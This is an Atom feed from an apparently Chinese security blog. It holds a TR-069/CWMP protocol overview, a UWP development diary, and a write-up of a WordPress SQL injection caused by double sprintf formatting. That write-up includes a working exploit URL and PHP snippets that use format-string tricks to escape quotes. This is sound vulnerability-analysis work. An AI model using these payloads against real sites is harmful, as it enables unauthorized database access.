<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SeaFood&#39;s blog</title>
  <subtitle>es muss sein? es muss sein!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://5eafood.github.io/"/>
  <updated>2017-09-18T15:50:05.000Z</updated>
  <id>https://5eafood.github.io/</id>
  
  <author>
    <name>SeaFood</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>tr-069</title>
    <link href="https://5eafood.github.io/2017/09/18/tr-069/"/>
    <id>https://5eafood.github.io/2017/09/18/tr-069/</id>
    <published>2017-09-18T15:48:25.000Z</published>
    <updated>2017-09-18T15:50:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TR-069协议简介"><a href="#TR-069协议简介" class="headerlink" title="TR-069协议简介"></a>TR-069协议简介</h1><p>TR069协议是宽带论坛 (broadband-forum) 制定的一个面向终端设备的网管协议，称为<strong>“用户终端设备广域网管理协议（CWMP，CPE Wan Management Protocol）”</strong>，文档编号为TR069，所以又称为<strong>TR069协议</strong>。</p>
<p>CWMP协议广泛地被各国ISP（互联网服务供应商）采用， 用来对企业和个人用户的互联网设备如无线路由器， VoIP电话，机顶盒等进行远程管理。</p>
<a id="more"></a>
<p><img src="1.png" alt="1"></p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul>
<li>ACS：Auto-Configuration Server （自动配置服务器）</li>
<li>CPE：Customer Premise Equipment（用户终端设备）</li>
<li>CWMP：CPE WAN Management Protocol（用户终端设备广域网管理协议）</li>
<li>RPC： Remote Procedure Call（远程过程调用）</li>
<li>SOAP： Simple Object Access Protocol（简单对象访问协议）</li>
<li>tr064： LAN side DSL CPE configuration（LAN侧DSL被管理设备设置协议）</li>
</ul>
<h2 id="CVE-2016-10372"><a href="#CVE-2016-10372" class="headerlink" title="CVE-2016-10372"></a><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10372" target="_blank" rel="external">CVE-2016-10372</a></h2><p>此漏洞被mirai使用造成了德国的断网事件，漏洞成因是德国运营商使用的<strong>Eir’s D1000 Modem</strong>，将本该暴露在LAN侧的<strong>tr-064</strong>协议服务暴露在了WAN侧，并没做身份认证，导致命令执行，从而被。</p>
<p><strong>tr-064</strong>与<strong>tr-069</strong>一同运行在7547端口，前者设计为在LAN上运行，而后者设计为在WAN侧运行。<strong>tr-064</strong>一个老版的不成熟的协议，目前只被使用在老设备上，新设备被 <strong>TR-064 Issue 2 </strong>替代。<br>所以说，此次的断网事件与<strong>tr-069</strong>并没关系，但许多报道将之归咎于此协议，算是背锅了。但<strong>tr-069</strong>使用广泛，之前也曾被爆出过漏洞，故十分有研究价值。</p>
<h1 id="会话过程"><a href="#会话过程" class="headerlink" title="会话过程"></a>会话过程</h1><p><img src="2.png" alt="1"></p>
<ol>
<li>CWMP的通信通常由CPE端发起，ACS的地址被写在CPE的配置中，CPE会定时向该地址发送<code>Inform RPC</code>，报告自身状态和统计信息</li>
<li>ACS收到后，如果开启了https，ACS应该使用<a href="http://blog.itpub.net/23071790/viewspace-709367/" target="_blank" rel="external">HTTP基础认证</a>，如果未使用https，则应使用<a href="http://blog.csdn.net/tenfyguo/article/details/8661517" target="_blank" rel="external">HTTP摘要认证</a>，认证成功后ACS会发送一个<code>InformResponse</code>，CPE收到后意味<code>Inform RPC</code>完成</li>
<li>如果CPE需要继续RPC，方法如上，如果不需要，则发送一个空的HTTP POST给ACS结束RPC</li>
<li>之后轮到ACS进行RPC，例如使用<code>GetParameterValues RPC</code>获取CPE上一些参数的值</li>
<li>CPE通过HTTP POST将结果返回给ACS</li>
<li>ACS同CPE发送一个空的HTTP POST给CPE结束PRC</li>
<li>会话结束</li>
</ol>
<h1 id="Connection-Request"><a href="#Connection-Request" class="headerlink" title="Connection Request"></a>Connection Request</h1><p>从上可知，通常会话是由CPE发起的，但有时，ACS需要主动联系CPE，为了实现这个目的，CWMP提供了<code>Connection Request</code>这个机制，允许ACS激活CPE发起一个会话。</p>
<ol>
<li>由ACS发出CPE随机生成的一个 URL 发送一个简单的HTTP GET请求</li>
<li>ACS需要通过CPE的HTTP 摘要认证</li>
<li>通过认证后，CPE会返回<code>200 OK or 204 &quot;No Content&quot;</code>，表示连接建立成功</li>
</ol>
<h1 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h1><p>CWMP使用<a href="http://www.w3school.com.cn/soap/soap_intro.asp" target="_blank" rel="external">SOAP</a>（简单对象访问协议）进行RPC。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:cwmp</span>=<span class="string">"urn:dslforum-org:cwmp-1-1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">cwmp:ID</span> <span class="attr">soap-env:mustUnderstand</span>=<span class="string">"1"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cwmp:ID</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">cwmp:Reboot</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">CommandKey</span>&gt;</span>4321<span class="tag">&lt;/<span class="name">CommandKey</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">cwmp:Reboot</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></div></pre></td></tr></table></figure>
<p>必需的 Envelope 元素，可把此 XML 文档标识为一条 SOAP 消息，命名空间 <code>xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</code>，这是SOAP的固定格式</p>
<p>在CWMP中，也存在不同的版本，所以引入命名空间<code>xmlns:cwmp=&quot;urn:dslforum-org:cwmp-1-1</code>，表示使用那一版的CWMP</p>
<p>可选的 Header 元素，包含头部信息，在CWMP中用来存放，ID (标记一对requests和response)，会话超时时间，版本信息等</p>
<p>必需的 Body 元素，包含所有的调用和响应信息，包含具体RPC方法和参数，如上的SOAP功能即使Reboot</p>
<p>可选的 Fault 元素，提供有关在处理此消息所发生错误的信息</p>
<h1 id="CPE的RPC"><a href="#CPE的RPC" class="headerlink" title="CPE的RPC"></a>CPE的RPC</h1><ol>
<li><p>GetRPCMethods    </p>
<p>获取支持的RPC方法</p>
</li>
<li><p>SetParameterValues      </p>
<p>设置CPE的参数       </p>
<p>key: ParameterList  value: ParameterValueStruct (name, value)      </p>
<p>key: ParameterKey value: string</p>
</li>
<li><p>GetParameterValues          </p>
<p>获取CPE的参数         </p>
<p>key: ParameterNames value: string</p>
</li>
<li><p>GetParameterNames        </p>
<p>获取CPE的参数名    </p>
<p>key: ParameterPath value: string     </p>
<p>key: NextLevel value: boolean 若为假，需要返回路径下所有参数，为真，则只返回该路劲下一层参数</p>
</li>
<li><p>SetParameterAttributes    </p>
<p>设置CPE的参数属性       </p>
<p>key: ParameterList value: SetParameterAttributesStruct     SetParameterAttributesStruct:     </p>
<p>Name,    </p>
<p>NotificationChange boolean 是否修改预警内容，   </p>
<p>Notification int[0:6] 当参数被修改时是否通知ACS, 0为不通知, 1-6代表不同的相应级别      </p>
<p>AccessListChange boolean 是否修改访问列表<br>AccessList string 定义写权限(write access) 0表示只有ACS可写, “Subscriber”表示   </p>
<blockquote>
<p>Indicates write access by an interface controlled on the subscriber LAN. Includes any and all such LAN-side mechanisms, which MAY include but are not limited to TR-064 (LAN-side DSL CPE<br>Configuration Protocol), UPnP, the device’s user interface, clientside telnet, and client-side SNMP.</p>
</blockquote>
</li>
<li><p>GetParameterAttributes      </p>
<p>获取CPE的参数属性     </p>
<p>key: ParameterNames string     </p>
<p>key: ParameterList value:SetParameterAttributesStruct     </p>
</li>
<li><p>AddObject</p>
<p>创造一个多实例对象的新实例( create a new instance of a Multi-Instance<br>Object)     </p>
<p>key: ObjectName value: string      </p>
<p>key: ParameterKey value: string</p>
</li>
<li><p>DeleteObject<br>删除一个对象的实例    </p>
<p>key: ObjectName value: string      </p>
<p>key: ParameterKey value: string</p>
</li>
<li><p>Download<br>让CPE去指定URL下载文件<br>key: FileType value: string           </p>
<p>key: URL  value: string          </p>
<p>key: Username  value: string  用于文件服务器认证           </p>
<p>key: Password  value: string           </p>
<p>key: FileSize value: unsignedInt           </p>
<p>key: TargetFileName value: string<br>key: DelaySeconds  value:unsignedInt 用于延迟下载</p>
</li>
<li><p>Reboot<br>重启<br>key: CommandKey value: string</p>
</li>
</ol>
<h1 id="Data-Models"><a href="#Data-Models" class="headerlink" title="Data Models"></a>Data Models</h1><p><a href="https://www.broadband-forum.org/standards-and-software/technical-specifications/tr-069-files-tools" target="_blank" rel="external"><strong>Data Models</strong></a>（数据模型）由一个个不同的<strong>objects</strong> （对象）和<strong>object</strong>对应的<strong>sub-objects</strong>（子对象）和 <strong>parameters</strong>（参数）组成。</p>
<p><strong>Data Models</strong>使用由类似树型的点分层关系组织起来。树干为需要配置的对象，树叶为具体的配置参数，所有配置参数都一些属性，例如是否可读写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">InternetGatewayDevice.ManagementServer.ConnectionRequestURL</div></pre></td></tr></table></figure>
<p>这条规定了CPE的URL，<code>InternetGatewayDevice</code>为根节点，<code>ManagementServer</code>为<strong>object</strong>，<code>ConnectionRequestURL</code>为<strong>parameter</strong></p>
<p>CWMP最初设计时，被使用在家用路由器和网关设备，所以根结点为<code>InternetGatewayDevice</code>。现在CWMP扩展可管理其他设备，便设计了新的根节点为<code>Device</code>，如今使用的主要是<code>Device:2</code>。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.qacafe.com/tr-069-training/session-overview/" target="_blank" rel="external">https://www.qacafe.com/tr-069-training/session-overview/</a></p>
<p><a href="https://www.broadband-forum.org/technical/download/TR-069.pdf" target="_blank" rel="external">https://www.broadband-forum.org/technical/download/TR-069.pdf</a></p>
<p><a href="http://www.h3c.com/cn/Products___Technology/Technology/ComwareV5/System_Management/Other_technology/Technology_recommend/200805/606261_30003_0.htm" target="_blank" rel="external">http://www.h3c.com/cn/Products___Technology/Technology/ComwareV5/System_Management/Other_technology/Technology_recommend/200805/606261_30003_0.htm</a></p>
<p><a href="http://blog.csdn.net/Dreamcode/article/details/3864715" target="_blank" rel="external">http://blog.csdn.net/Dreamcode/article/details/3864715</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;TR-069协议简介&quot;&gt;&lt;a href=&quot;#TR-069协议简介&quot; class=&quot;headerlink&quot; title=&quot;TR-069协议简介&quot;&gt;&lt;/a&gt;TR-069协议简介&lt;/h1&gt;&lt;p&gt;TR069协议是宽带论坛 (broadband-forum) 制定的一个面向终端设备的网管协议，称为&lt;strong&gt;“用户终端设备广域网管理协议（CWMP，CPE Wan Management Protocol）”&lt;/strong&gt;，文档编号为TR069，所以又称为&lt;strong&gt;TR069协议&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;CWMP协议广泛地被各国ISP（互联网服务供应商）采用， 用来对企业和个人用户的互联网设备如无线路由器， VoIP电话，机顶盒等进行远程管理。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>php_format_string</title>
    <link href="https://5eafood.github.io/2017/09/18/php-format-string/"/>
    <id>https://5eafood.github.io/2017/09/18/php-format-string/</id>
    <published>2017-09-18T15:35:58.000Z</published>
    <updated>2017-09-18T15:54:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从WordPress-SQLi谈PHP格式化字符串问题"><a href="#从WordPress-SQLi谈PHP格式化字符串问题" class="headerlink" title="从WordPress SQLi谈PHP格式化字符串问题"></a>从WordPress SQLi谈PHP格式化字符串问题</h1><p><br></p>
<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>近日，WordPress爆出了一个<a href="https://www.seebug.org/vuldb/ssvid-96376" target="_blank" rel="external">SQLi漏洞</a>，漏洞发生在WP的后台上传图片的位置，通过修改图片在数据库中的参数，以及利用php的<code>sprintf</code>函数的特性，在删除图片时，导致<code>&#39;</code>单引号的逃逸。漏洞利用较为困难，但思路非常值得学习。</p>
<p><br><br><a id="more"></a></p>
<h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h3><p>漏洞发生在<strong>wp-admin/upload.php</strong>的157行，进入删除功能，</p>
<p><img src="3.png" alt="3"></p>
<p>之后进入函数<code>wp_delete_attachment( $post_id_del )</code>，<strong>$post_id_del</strong>可控，而且没有做<strong>(int)</strong>格式转化处理。</p>
<p><br></p>
<p><strong>wp_delete_attachment</strong>位于<code>wp-includes\post.php</code>的 4863 行。其中</p>
<p><img src="4.png" alt="4"></p>
<p>图片的post_id被带入查询，<strong>$wpdb-&gt;prepare</strong>中使用了<strong>sprintf</strong>，会做自动的类型转化，可以输入<code>22 payload</code>，会被转化为<code>22</code>，因而可以绕过。</p>
<p><br></p>
<p>之后进入4898行的<code>delete_metadata( &#39;post&#39;, null, &#39;_thumbnail_id&#39;, $post_id, true );</code>函数。</p>
<p><strong>delete_metadata</strong>函数位于<code>wp-includes\meta.php</code>的307行，</p>
<p><img src="5.png" alt="5"></p>
<p>在这里代码拼接出了如下sql语句，<strong>meta_value</strong>为传入的<strong>media</strong>参数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> meta_id <span class="keyword">FROM</span> wp_postmeta <span class="keyword">WHERE</span> meta_key = <span class="string">'_thumbnail_id'</span> <span class="keyword">AND</span> meta_value = <span class="string">'payload'</span></div></pre></td></tr></table></figure>
<p>之后这条语句会进入查询，结果为真代码才能继续，所以要修改<strong>_thumbnail_id</strong>对应的<strong>meta_value</strong>的值为payload，保证有查询结果。</p>
<p>因此，我们需要上传一张图片，并在<code>写文章</code>中设置为<strong>特色图片</strong>。</p>
<p>在数据库的<code>wp_postmeta</code>表中可以看到，<code>_thumbnail_id</code>即是特色图片设定的值，对应的<strong>meta_value</strong>即图片的<strong>post_id</strong>。</p>
<p><img src="1.png" alt="1"></p>
<p>原文通过一个 WP&lt;4.7.5 版本的xmlrpc漏洞修改<code>_thumbnail_id</code>对应<strong>meta_value</strong>的值，或通过插件<code>importer</code>修改。这里直接在数据库里修改，修改为我们的payload。</p>
<p><br></p>
<p>之后在365行，此处便是漏洞的核心，问题在于代码使用了两次<code>sprintf</code>拼接语句，导致可控的payload进入了第二次的<code>sprintf</code>。输入payload为<code>22 %1$%s hello</code></p>
<p><img src="9.png" alt="9"></p>
<p>代码会拼接出sql语句，带入<strong>$wpdb-&gt;prepare</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> post_id <span class="keyword">FROM</span> wp_postmeta <span class="keyword">WHERE</span> meta_key = <span class="string">'%s'</span>  <span class="keyword">AND</span> meta_value = <span class="string">'22 %1$%s hello'</span></div></pre></td></tr></table></figure>
<p><br></p>
<p>进入<strong>$wpdb-&gt;prepare</strong>后，代码会将所有<code>%s</code>转化为<code>&#39;%s&#39;</code>，即<code>meta_value = &#39;22 %1$&#39;%s&#39; hello&#39;</code></p>
<p><img src="6.png" alt="2"></p>
<p>因为<strong>sprintf</strong>的问题 (vsprintf与sprintf类似) ，<code>&#39;%s&#39;</code>的前一个<code>&#39;</code>会被吃掉，<code>%1$&#39;%s</code>被格式化为_thumbnail_id ，最后格式化字符串出来的语句会变成</p>
<p><img src="2.png" alt="2"></p>
<p>单引号成功逃逸！</p>
<p>最后payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/wp-admin/upload.php?action=delete&amp;media[]=22%20%251%24%25s%20hello&amp;_wpnonce=bbba5b9cd3</div></pre></td></tr></table></figure>
<p>这个SQL注入不会报错，只能使用延时注入，而且需要后台的上传权限，所以利用起来比较困难。</p>
<p><br></p>
<h3 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h3><p>上述WordPress的SQLi的核心问题在于在<code>sprintf</code>中，<code>&#39;%s&#39;</code>的前一个<code>&#39;</code>被吃掉了，这里利用了<code>sprintf</code>的<code>padding</code>功能</p>
<p><img src="7.png" alt="7"></p>
<p>单引号后的一个字符会作为padding填充字符串。</p>
<p>此外，<code>sprintf</code>函数可以使用下面这种写法</p>
<p><img src="8.png" alt="8"></p>
<p><strong>%</strong>后的数字代表第几个参数，<strong>$</strong>后代表类型。</p>
<p>所以，payload<code>%1$&#39;%s&#39;</code>中的<code>&#39;%</code>被视为使用<code>%</code>进行 padding，导致了<code>&#39;</code>的逃逸。</p>
<p><br></p>
<h3 id="0x04-php格式化字符串"><a href="#0x04-php格式化字符串" class="headerlink" title="0x04 php格式化字符串"></a>0x04 php格式化字符串</h3><p>但在测试过程中，还发现其他问题。php的<code>sprintf</code>或<code>vsprintf</code>函数对格式化的字符类型没做检查。</p>
<p>如下代码是可以执行的，显然php格式化字符串中并不存在<code>%y</code>类型，但php不会报错，也不会输出<code>%y</code>，而是输出为空</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$query = <span class="string">"%y"</span>;</div><div class="line">$args = <span class="string">'b'</span>;</div><div class="line"><span class="keyword">echo</span> sprintf( $query, $args ) ;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>通过fuzz得知，在php的格式化字符串中，%后的一个字符(除了<code>&#39;%&#39;</code>)会被当作字符类型，而被吃掉，单引号<code>&#39;</code>，斜杠<code>\</code>也不例外。</p>
<p>如果能提前将<code>%&#39; and 1=1#</code>拼接入sql语句，若存在SQLi过滤，单引号会被转义成<code>\&#39;</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'%\' and 1=1#'</span>;</div></pre></td></tr></table></figure>
<p>然后这句sql语句如果继续进入格式化字符串，<code>\</code>会被<code>%</code>吃掉，<code>&#39;</code>成功逃逸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql = <span class="string">"select * from user where username = '%\' and 1=1#';"</span>;</div><div class="line">$args = <span class="string">"admin"</span>;</div><div class="line"><span class="keyword">echo</span> sprintf( $sql, $args ) ;</div><div class="line"><span class="comment">//result: select * from user where username = '' and 1=1#'</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>不过这样容易遇到<code>PHP Warning:  sprintf(): Too few arguments</code>的报错。</p>
<p>还可以使用<code>%1$</code>吃掉后面的斜杠，而不引起报错。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql = <span class="string">"select * from user where username = '%1$\' and 1=1#' and password='%s';"</span>;</div><div class="line">$args = <span class="string">"admin"</span>;</div><div class="line"><span class="keyword">echo</span> sprintf( $sql, $args) ;</div><div class="line"><span class="comment">//result: select * from user where username = '' and 1=1#' and password='admin';</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><br></p>
<p>通过翻阅php的<a href="https://github.com/php/php-src/blob/master/ext/standard/formatted_print.c" target="_blank" rel="external">源码</a>，在<code>ext/standard/formatted_print.c</code>的642行</p>
<p><img src="10.png" alt="10"></p>
<p>可以发现php的<code>sprintf</code>是使用switch..case..实现，对于未知的类型<code>default</code>，php未做任何处理，直接跳过，所以导致了这个问题。</p>
<p>在<a href="https://github.com/80vul/pasc2at" target="_blank" rel="external">高级php代码审核技术</a>中的5.3.5中，提及过使用<code>$order_sn=substr($_GET[&quot;order_sn&quot;], 1)</code>截断吃掉<code>\</code>或<code>&quot;</code>。</p>
<p>之前也有过利用<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">iconv</a>转化字符编码，<code>iconv(&#39;utf-8&#39;, &#39;gbk&#39;, $_GET[&#39;word&#39;])</code>因为utf-8和gbk的长度不同而吃掉<code>\</code>。</p>
<p>几者的问题同样出现在字符串的处理，可以导致<code>&#39;</code>的转义失败或其他问题，可以想到其他字符串处理函数可能存在类似的问题，值得去继续发掘。</p>
<p><br></p>
<h3 id="0x05-利用条件"><a href="#0x05-利用条件" class="headerlink" title="0x05 利用条件"></a>0x05 利用条件</h3><ol>
<li><p>执行语句使用<code>sprintf</code>或<code>vsrptinf</code>进行拼接</p>
</li>
<li><p>执行语句进行了两次拼接，第一次拼接的参数内容可控，类似如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$input = addslashes(<span class="string">"%1$' and 1=1#"</span>);</div><div class="line">$b = sprintf(<span class="string">"AND b='%s'"</span>, $input);</div><div class="line">...</div><div class="line">$sql = sprintf(<span class="string">"SELECT * FROM t WHERE a='%s' $b"</span>, <span class="string">'admin'</span>);</div><div class="line"><span class="keyword">echo</span> $sql;</div><div class="line"><span class="comment">//result: SELECT * FROM t WHERE a='admin' AND b=' ' and 1=1#'</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p><br></p>
<h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><p>此次漏洞的核心还是<code>sprintf</code>的问题，同一语句的两次拼接，意味着可控的内容被带进了格式化字符串，又因为<code>sprintf</code>函数的处理问题，最终导致漏洞的发生。</p>
<p>此问题可能仍会出现在WordPress的插件，原文的评论中也有人提到曾在Joomla中发现过类似的问题。而其他使用<code>sprintf</code>进行字符串拼接的cms，同样可能因此导致SQL注入和代码执行等漏洞。</p>
<p><br></p>
<h3 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h3><p><a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">https://medium.com/websec/wordpress-sqli-bbb2afcc8e94</a></p>
<p><a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e</a></p>
<p><a href="http://php.net/manual/zh/function.sprintf.php" target="_blank" rel="external">http://php.net/manual/zh/function.sprintf.php</a></p>
<p><a href="https://github.com/php/php-src/blob/c8aa6f3a9a3d2c114d0c5e0c9fdd0a465dbb54a5/ext/standard/formatted_print.c" target="_blank" rel="external">https://github.com/php/php-src/blob/c8aa6f3a9a3d2c114d0c5e0c9fdd0a465dbb54a5/ext/standard/formatted_print.c</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-96376" target="_blank" rel="external">https://www.seebug.org/vuldb/ssvid-96376</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;从WordPress-SQLi谈PHP格式化字符串问题&quot;&gt;&lt;a href=&quot;#从WordPress-SQLi谈PHP格式化字符串问题&quot; class=&quot;headerlink&quot; title=&quot;从WordPress SQLi谈PHP格式化字符串问题&quot;&gt;&lt;/a&gt;从WordPress SQLi谈PHP格式化字符串问题&lt;/h1&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h3&gt;&lt;p&gt;近日，WordPress爆出了一个&lt;a href=&quot;https://www.seebug.org/vuldb/ssvid-96376&quot;&gt;SQLi漏洞&lt;/a&gt;，漏洞发生在WP的后台上传图片的位置，通过修改图片在数据库中的参数，以及利用php的&lt;code&gt;sprintf&lt;/code&gt;函数的特性，在删除图片时，导致&lt;code&gt;&amp;#39;&lt;/code&gt;单引号的逃逸。漏洞利用较为困难，但思路非常值得学习。&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>uwp</title>
    <link href="https://5eafood.github.io/2017/05/28/uwp/"/>
    <id>https://5eafood.github.io/2017/05/28/uwp/</id>
    <published>2017-05-27T17:58:22.000Z</published>
    <updated>2017-05-27T18:00:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UWP从入门到放弃"><a href="#UWP从入门到放弃" class="headerlink" title="UWP从入门到放弃"></a>UWP从入门到放弃</h1><p>uwp全称是Universal Windows Platform，是window通用应用平台，可以兼容运行在PC平台和移动平台。<br><a id="more"></a></p>
<p>这是怎么做到的呢？解压安装包可以发现一个uwp的包里包括了x64 x86 arm三种的安装包，真是简单暴力</p>
<p><img src="uwp\uwp1.PNG" alt="uwp1"></p>
<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>首先，你需要<strong>Visual Studio  2015</strong>或<strong>Visual Studio 2017</strong>，安装时勾上通用window应用开发工具</p>
<p><img src="uwp\20160303_145340_786.jpg" alt="20160303_145340_786"></p>
<p>默认情况下，在微软官网下载Visual Studio时，是用下载器在线安装，可能是我家的网络比较zz，下了一晚上都没好TAT，后来找到了iso，可安装时，还是要在线安装一些东西，就疯狂失败。最后用<strong>proxifier</strong>挂代理，又下了一晚上才好，zz微软。</p>
<p>uwp应用的前端用xaml写，语法类似html和xml，后端可以用c++，c#，js写，具体可以看我后面给的教程。</p>
<h2 id="放弃"><a href="#放弃" class="headerlink" title="放弃"></a>放弃</h2><p>主要还时讲讲我遇到的一些坑。</p>
<p>在uwp中使用SQLite，需要在<strong>扩展与更新</strong>中安装<strong>SQLite for Universal Windows Platform </strong>，然后在<strong>管理Nuget程序包管理</strong>中安装<strong>SQLite.Net-PCL</strong>这个库用以操作SQLite。</p>
<p>但我在运行程序的时候，在触发数据库操作后，就会发生异常中断，报错<strong>unable to load dll ‘sqlite3’:the specified module could not be found</strong>。google了很久，网上的解决方法都没法解决问题。后来我尝试去安装了另一个库<strong>System.Data.SQLite</strong>，居然解决了问题，可能是刚好补全了缺少的文件吧。</p>
<p>在多次创建程序包后，可能会出现XX路径无法访问的错误，解决方法就是删除程序文件夹中的<strong>bin</strong>和<strong>obj</strong>文件夹。但<strong>Visual Studio</strong>在运行中时删不掉他们的，关闭再开启又要好久，难受。</p>
<p>uwp的中文资料真的少的可怜，微软官方的中文手册，可以说是写的不清不楚，毫无用处。</p>
<p>写uwp本来就是为了玩玩，毕竟用了很久的windows phone，然后我就换手机了，应该说连入门都没有就放弃了。</p>
<p>微软药丸！</p>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><a href="https://github.com/Microsoft/Windows-universal-samples/blob/master/Samples/ContactCards/shared/Scenario1_Mini.xaml" target="_blank" rel="external">https://github.com/Microsoft/Windows-universal-samples/blob/master/Samples/ContactCards/shared/Scenario1_Mini.xaml</a></p>
<p><a href="http://space.bilibili.com/18340402/#!/channel/detail?cid=1436&amp;page=1&amp;order=0" target="_blank" rel="external">http://space.bilibili.com/18340402/#!/channel/detail?cid=1436&amp;page=1&amp;order=0</a></p>
<p><a href="https://comentsys.wordpress.com/2015/05/03/windows-10-universal-windows-platform-hello-world/" target="_blank" rel="external">https://comentsys.wordpress.com/2015/05/03/windows-10-universal-windows-platform-hello-world/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;UWP从入门到放弃&quot;&gt;&lt;a href=&quot;#UWP从入门到放弃&quot; class=&quot;headerlink&quot; title=&quot;UWP从入门到放弃&quot;&gt;&lt;/a&gt;UWP从入门到放弃&lt;/h1&gt;&lt;p&gt;uwp全称是Universal Windows Platform，是window通用应用平台，可以兼容运行在PC平台和移动平台。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CI_Router</title>
    <link href="https://5eafood.github.io/2017/05/02/CI-Router/"/>
    <id>https://5eafood.github.io/2017/05/02/CI-Router/</id>
